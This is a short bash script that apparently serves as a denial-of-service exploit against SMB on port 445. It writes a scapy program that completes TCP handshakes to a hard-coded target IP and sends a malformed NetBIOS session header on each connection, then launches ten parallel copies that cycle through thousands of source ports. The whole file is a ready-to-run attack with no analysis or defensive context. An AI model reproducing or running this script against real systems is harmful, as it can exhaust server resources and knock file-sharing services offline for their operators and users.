#!/bin/bash

# sudo apt-get install python-pip
# sudo apt-get install python-setuptools
# sudo pip install scapy

TARGETIP='192.168.1.106'

cat > smb3.py << EOF
from scapy.all import *
import sys
p0 = int(sys.argv[1])
conf.L3socket
conf.L3socket=L3RawSocket
i=IP()
i.dst="$TARGETIP"
t=TCP()
t.dport=445

for p in range(p0,p0+700):
  print p
  t.sport = p
  t.flags = "S"

  r=sr1(i/t)
  rt=r[TCP]
  t.ack=rt.seq+1
  t.seq=rt.ack
  t.flags="A"
  sbss='\x00\x01\xff\xff'
  send(i/t/sbss)
EOF


python smb3.py 0 &
python smb3.py 1000 &
python smb3.py 2000 &
python smb3.py 3000 &
python smb3.py 4000 &
python smb3.py 5000 &
python smb3.py 6000 &
python smb3.py 7000 &
python smb3.py 8000 &
python smb3.py 9000 &